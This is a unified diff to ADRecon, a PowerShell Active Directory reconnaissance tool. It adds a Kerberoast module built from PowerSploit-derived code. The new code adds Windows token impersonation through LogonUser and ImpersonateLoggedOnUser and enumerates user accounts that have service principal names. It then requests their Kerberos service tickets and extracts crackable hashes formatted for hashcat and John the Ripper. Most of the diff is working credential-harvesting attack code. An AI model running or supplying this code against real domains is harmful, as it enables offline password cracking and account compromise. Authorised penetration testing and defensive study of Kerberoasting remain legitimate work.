@@ -75,8 +75,8 @@
 	Path for ADRecon output folder to save the files and the ADRecon-Report.xlsx. (The folder specified will be created if it doesn't exist)
 
 .PARAMETER Collect
-    Which modules to run; Comma separated; e.g Forest,Domain (Default all)
-    Valid values include: Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, OUs, ACLs, GPOs, GPOReport, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker.
+    Which modules to run; Comma separated; e.g Forest,Domain (Default all except Kerberoast)
+    Valid values include: Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, OUs, ACLs, GPOs, GPOReport, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker, Kerberoast.
 
 .PARAMETER OutputType
     Output Type; Comma seperated; e.g STDOUT,CSV,XML,JSON,HTML,Excel (Default STDOUT with -Collect parameter, else CSV and Excel).
@@ -236,8 +236,8 @@ param
     [Parameter(Mandatory = $false, HelpMessage = "Path for ADRecon output folder to save the CSV/XML/JSON/HTML files and the ADRecon-Report-<ddMMMyy>.xlsx. (The folder specified will be created if it doesn't exist)")]
     [string] $OutputDir,
 
-    [Parameter(Mandatory = $false, HelpMessage = "Which modules to run; Comma separated; e.g Forest,Domain (Default all) Valid values include: Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, OUs, ACLs, GPOs, GPOReport, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker")]
-    [ValidateSet('Forest', 'Domain', 'Trusts', 'Sites', 'Subnets', 'PasswordPolicy', 'FineGrainedPasswordPolicy', 'DomainControllers', 'Users', 'UserSPNs', 'PasswordAttributes', 'Groups', 'GroupMembers', 'OUs', 'ACLs', 'GPOs', 'GPOReport', 'DNSZones', 'Printers', 'Computers', 'ComputerSPNs', 'LAPS', 'BitLocker', 'Default')]
+    [Parameter(Mandatory = $false, HelpMessage = "Which modules to run; Comma separated; e.g Forest,Domain (Default all except Kerberoast) Valid values include: Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, OUs, ACLs, GPOs, GPOReport, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker, Kerberoast")]
+    [ValidateSet('Forest', 'Domain', 'Trusts', 'Sites', 'Subnets', 'PasswordPolicy', 'FineGrainedPasswordPolicy', 'DomainControllers', 'Users', 'UserSPNs', 'PasswordAttributes', 'Groups', 'GroupMembers', 'OUs', 'ACLs', 'GPOs', 'GPOReport', 'DNSZones', 'Printers', 'Computers', 'ComputerSPNs', 'LAPS', 'BitLocker', 'Kerberoast', 'Default')]
     [array] $Collect = 'Default',
 
     [Parameter(Mandatory = $false, HelpMessage = "Output type; Comma seperated; e.g STDOUT,CSV,XML,JSON,HTML,Excel (Default STDOUT with -Collect parameter, else CSV and Excel)")]
@@ -2630,6 +2630,30 @@ namespace ADRecon
 	}
 }
 "@
+
+# Import the LogonUser, ImpersonateLoggedOnUser and RevertToSelf Functions from advapi32.dll and the CloseHandle Function from kernel32.dll
+# https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Utility/Add-Type?view=powershell-5.1
+# https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx
+# https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx
+# https://msdn.microsoft.com/en-us/library/windows/desktop/aa379317(v=vs.85).aspx
+
+$Advapi32Def = @'
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool RevertToSelf();
+'@
+
+# https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx
+
+$Kernel32Def = @'
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+'@
 
 Function Get-DateDiff
 {
@@ -8903,6 +8927,408 @@ Function Get-ADRGPOReport
     }
 }
 
+# Modified Invoke-UserImpersonation function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+Function Get-ADRUserImpersonation
+{
+<#
+.SYNOPSIS
+
+Creates a new "runas /netonly" type logon and impersonates the token.
+
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: PSReflect
+
+.DESCRIPTION
+
+This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
+to simulate "runas /netonly". The resulting token is then impersonated with
+ImpersonateLoggedOnUser() and the token handle is returned for later usage
+with Invoke-RevertToSelf.
+
+.PARAMETER Credential
+
+A [Management.Automation.PSCredential] object with alternate credentials
+to impersonate in the current thread space.
+
+.PARAMETER TokenHandle
+
+An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
+If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
+is executed.
+
+.PARAMETER Quiet
+
+Suppress any warnings about STA vs MTA.
+
+.EXAMPLE
+
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+Invoke-UserImpersonation -Credential $Cred
+
+.OUTPUTS
+
+IntPtr
+
+The TokenHandle result from LogonUser.
+#>
+
+    [OutputType([IntPtr])]
+    [CmdletBinding(DefaultParameterSetName = 'Credential')]
+    Param(
+        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential,
+
+        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
+        [ValidateNotNull()]
+        [IntPtr]
+        $TokenHandle,
+
+        [Switch]
+        $Quiet
+    )
+
+    If (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet']))
+    {
+        Write-Warning "[Get-ADRUserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
+    }
+
+    If ($PSBoundParameters['TokenHandle'])
+    {
+        $LogonTokenHandle = $TokenHandle
+    }
+    Else
+    {
+        $LogonTokenHandle = [IntPtr]::Zero
+        $NetworkCredential = $Credential.GetNetworkCredential()
+        $UserDomain = $NetworkCredential.Domain
+        If (-Not $UserDomain)
+        {
+            Write-Warning "[Get-ADRUserImpersonation] Use credential with Domain FQDN. (<Domain FQDN>\<Username>)"
+        }
+        $UserName = $NetworkCredential.UserName
+        Write-Warning "[Get-ADRUserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
+
+        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
+        #   this is to simulate "runas.exe /netonly" functionality
+        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)
+        $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
+
+        If (-not $Result)
+        {
+            throw "[Get-ADRUserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+        }
+    }
+
+    # actually impersonate the token from LogonUser()
+    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)
+
+    If (-not $Result)
+    {
+        throw "[Get-ADRUserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+    }
+
+    Write-Verbose "[Get-ADR-UserImpersonation] Alternate credentials successfully impersonated"
+    $LogonTokenHandle
+}
+
+# Modified Invoke-RevertToSelf function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+Function Get-ADRRevertToSelf
+{
+<#
+.SYNOPSIS
+
+Reverts any token impersonation.
+
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: PSReflect
+
+.DESCRIPTION
+
+This function uses RevertToSelf() to revert any impersonated tokens.
+If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),
+CloseHandle() is used to close the opened handle.
+
+.PARAMETER TokenHandle
+
+An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.
+
+.EXAMPLE
+
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+$Token = Invoke-UserImpersonation -Credential $Cred
+Invoke-RevertToSelf -TokenHandle $Token
+#>
+
+    [CmdletBinding()]
+    Param(
+        [ValidateNotNull()]
+        [IntPtr]
+        $TokenHandle
+    )
+
+    If ($PSBoundParameters['TokenHandle'])
+    {
+        Write-Warning "[Get-ADRRevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
+        $Result = $Kernel32::CloseHandle($TokenHandle)
+    }
+
+    $Result = $Advapi32::RevertToSelf()
+    $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
+
+    If (-not $Result)
+    {
+        Write-Error "[Get-ADRRevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+    }
+
+    Write-Verbose "[Get-ADRRevertToSelf] Token impersonation successfully reverted"
+}
+
+# Modified Get-DomainSPNTicket function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+Function Get-ADRSPNTicket
+{
+<#
+<#
+.SYNOPSIS
+    Request the kerberos ticket for a specified service principal name (SPN).
+
+    Author: machosec, Will Schroeder (@harmj0y)
+    License: BSD 3-Clause
+    Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf
+
+.DESCRIPTION
+    This function will either take one SPN strings, and will request a kerberos ticket for the given SPN using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted portion of the ticket is then extracted and output in either crackable Hashcat format.
+
+.PARAMETER UserSPN
+    [string]
+    Service Principal Name.
+
+.OUTPUTS
+    PSObject.
+#>
+    param(
+        [Parameter(Mandatory = $true)]
+        [string] $UserSPN
+    )
+
+    Try
+    {
+        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
+        $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
+    }
+    Catch
+    {
+        Write-Warning "[Get-ADRSPNTicket] Error requesting ticket for SPN $UserSPN"
+        Write-Warning "[EXCEPTION] $($_.Exception.Message)"
+        Return $null
+    }
+
+    If ($Ticket)
+    {
+        $TicketByteStream = $Ticket.GetRequest()
+    }
+
+    If ($TicketByteStream)
+    {
+        $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
+
+        # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
+        # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
+        If ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)')
+        {
+            $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
+            $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
+            $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
+
+            # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
+            If ($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482')
+            {
+                Write-Warning '[Get-ADRSPNTicket] Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName).' # Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq
+                $Hash = $null
+            }
+            Else
+            {
+                $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
+            }
+        }
+        Else
+        {
+            Write-Warning "[Get-ADRSPNTicket] Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName)." # Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq
+            $Hash = $null
+        }
+    }
+    $Obj = New-Object PSObject
+    $Obj | Add-Member -MemberType NoteProperty -Name "ServicePrincipalName" -Value $Ticket.ServicePrincipalName
+    $Obj | Add-Member -MemberType NoteProperty -Name "Etype" -Value $Etype
+    $Obj | Add-Member -MemberType NoteProperty -Name "Hash" -Value $Hash
+    Return $Obj
+}
+
+Function Get-ADRKerberoast
+{
+<#
+.SYNOPSIS
+    Returns all user service principal name (SPN) hashes in the current (or specified) domain.
+
+.DESCRIPTION
+    Returns all user service principal name (SPN) hashes in the current (or specified) domain.
+
+.PARAMETER Protocol
+    [string]
+    Which protocol to use; ADWS (default) or LDAP.
+
+.PARAMETER objDomain
+    [DirectoryServices.DirectoryEntry]
+    Domain Directory Entry object.
+
+.PARAMETER Credential
+    [Management.Automation.PSCredential]
+    Credentials.
+
+.PARAMETER PageSize
+    [int]
+    The PageSize to set for the LDAP searcher object. Default 200.
+
+.OUTPUTS
+    PSObject.
+#>
+    param(
+        [Parameter(Mandatory = $true)]
+        [string] $Protocol,
+
+        [Parameter(Mandatory = $false)]
+        [DirectoryServices.DirectoryEntry] $objDomain,
+
+        [Parameter(Mandatory = $false)]
+        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $true)]
+        [int] $PageSize
+    )
+
+    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
+    {
+        $LogonToken = Get-ADRUserImpersonation -Credential $Credential
+    }
+
+    If ($Protocol -eq 'ADWS')
+    {
+        Try
+        {
+            $ADUsers = Get-ADObject -LDAPFilter "(&(!objectClass=computer)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))" -Properties sAMAccountName,servicePrincipalName,DistinguishedName -ResultPageSize $PageSize
+        }
+        Catch
+        {
+            Write-Warning "[Get-ADRKerberoast] Error while enumerating UserSPN Objects"
+            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
+            Return $null
+        }
+
+        If ($ADUsers)
+        {
+            $UserSPNObj = @()
+            $ADUsers | ForEach-Object {
+                ForEach ($UserSPN in $_.servicePrincipalName)
+                {
+                    $Obj = New-Object PSObject
+                    $Obj | Add-Member -MemberType NoteProperty -Name "Username" -Value $_.sAMAccountName
+                    $Obj | Add-Member -MemberType NoteProperty -Name "ServicePrincipalName" -Value $UserSPN
+
+                    $HashObj = Get-ADRSPNTicket $UserSPN
+                    If ($HashObj)
+                    {
+                        $UserDomain = $_.DistinguishedName.SubString($_.DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        # JohnTheRipper output format
+                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
+                        # hashcat output format
+                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.SamAccountName)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
+                    }
+                    Else
+                    {
+                        $JTRHash = $null
+                        $HashcatHash = $null
+                    }
+                    $Obj | Add-Member -MemberType NoteProperty -Name "John" -Value $JTRHash
+                    $Obj | Add-Member -MemberType NoteProperty -Name "Hashcat" -Value $HashcatHash
+                    $UserSPNObj += $Obj
+                }
+            }
+            Remove-Variable ADUsers
+        }
+    }
+
+    If ($Protocol -eq 'LDAP')
+    {
+        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
+        $ObjSearcher.PageSize = $PageSize
+        $ObjSearcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
+        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","samaccountname","serviceprincipalname","useraccountcontrol"))
+        $ObjSearcher.SearchScope = "Subtree"
+        Try
+        {
+            $ADUsers = $ObjSearcher.FindAll()
+        }
+        Catch
+        {
+            Write-Warning "[Get-ADRKerberoast] Error while enumerating UserSPN Objects"
+            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
+            Return $null
+        }
+        $ObjSearcher.dispose()
+
+        If ($ADUsers)
+        {
+            $UserSPNObj = @()
+            $ADUsers | ForEach-Object {
+                ForEach ($UserSPN in $_.Properties.serviceprincipalname)
+                {
+                    $Obj = New-Object PSObject
+                    $Obj | Add-Member -MemberType NoteProperty -Name "Username" -Value $_.Properties.samaccountname[0]
+                    $Obj | Add-Member -MemberType NoteProperty -Name "ServicePrincipalName" -Value $UserSPN
+
+                    $HashObj = Get-ADRSPNTicket $UserSPN
+                    If ($HashObj)
+                    {
+                        $UserDomain = $_.Properties.distinguishedname[0].SubString($_.Properties.distinguishedname[0].IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        # JohnTheRipper output format
+                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
+                        # hashcat output format
+                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.Properties.samaccountname)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
+                    }
+                    Else
+                    {
+                        $JTRHash = $null
+                        $HashcatHash = $null
+                    }
+                    $Obj | Add-Member -MemberType NoteProperty -Name "John" -Value $JTRHash
+                    $Obj | Add-Member -MemberType NoteProperty -Name "Hashcat" -Value $HashcatHash
+                    $UserSPNObj += $Obj
+                }
+            }
+            Remove-Variable ADUsers
+        }
+    }
+
+    If ($LogonToken)
+    {
+        Get-ADRRevertToSelf -TokenHandle $LogonToken
+    }
+
+    If ($UserSPNObj)
+    {
+        Return $UserSPNObj
+    }
+    Else
+    {
+        Return $null
+    }
+}
+
 Function Remove-EmptyADROutputDir
 {
 <#
@@ -9078,7 +9504,7 @@ Function Invoke-ADRecon
 
 .PARAMETER Collect
     [array]
-    Which modules to run; Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, OUs, ACLs, GPOs, GPOReport, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker
+    Which modules to run; Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, OUs, ACLs, GPOs, GPOReport, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker, Kerberoast.
 
 .PARAMETER DomainController
     [string]
@@ -9161,7 +9587,7 @@ Function Invoke-ADRecon
         [bool] $UseAltCreds = $false
     )
 
-    [string] $ADReconVersion = "v180804"
+    [string] $ADReconVersion = "v1.0"
     Write-Output "[*] ADRecon $ADReconVersion by Prashant Mahajan (@prashant3535) from Sense of Security."
 
     If ($GenExcel)
@@ -9272,6 +9698,8 @@ Function Invoke-ADRecon
     $script:DebugPreference = 'SilentlyContinue'
     Try
     {
+        $Advapi32 = Add-Type -MemberDefinition $Advapi32Def -Name "Advapi32" -Namespace ADRecon -PassThru
+        $Kernel32 = Add-Type -MemberDefinition $Kernel32Def -Name "Kernel32" -Namespace ADRecon -PassThru
         Add-Type -TypeDefinition $PingCastleSMBScannerSource
         $CLR = ([System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion)[1]
         If ($Protocol -eq 'ADWS')
@@ -9383,6 +9811,7 @@ Function Invoke-ADRecon
         'ComputerSPNs' { $ADRComputerSPNs = $true }
         'BitLocker' { $ADRBitLocker = $true }
         'LAPS' { $ADRLAPS = $true }
+        'Kerberoast' { $ADRKerberoast = $true }
         'Default'
         {
             $ADRForest = $true
@@ -9408,6 +9837,7 @@ Function Invoke-ADRecon
             $ADRComputerSPNs = $true
             $ADRLAPS = $true
             $ADRBitLocker = $true
+            #$ADRKerberoast = $true
             If ($OutputType -eq "Default")
             {
                 [array] $OutputType = "CSV","Excel"
@@ -9883,6 +10313,17 @@ Function Invoke-ADRecon
         Write-Output "[-] GPOReport - May take some time"
         Get-ADRGPOReport -Protocol $Protocol -UseAltCreds $UseAltCreds -ADROutputDir $ADROutputDir
         Remove-Variable ADRGPOReport
+    }
+    If ($ADRKerberoast)
+    {
+        Write-Output "[-] Kerberoast"
+        $ADRObject = Get-ADRKerberoast -Protocol $Protocol -objDomain $objDomain -Credential $Credential -PageSize $PageSize
+        If ($ADRObject)
+        {
+            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName "Kerberoast"
+            Remove-Variable ADRObject
+        }
+        Remove-Variable ADRKerberoast
     }
 
     $TotalTime = "{0:N2}" -f ((Get-DateDiff -Date1 (Get-Date) -Date2 $date).TotalMinutes)
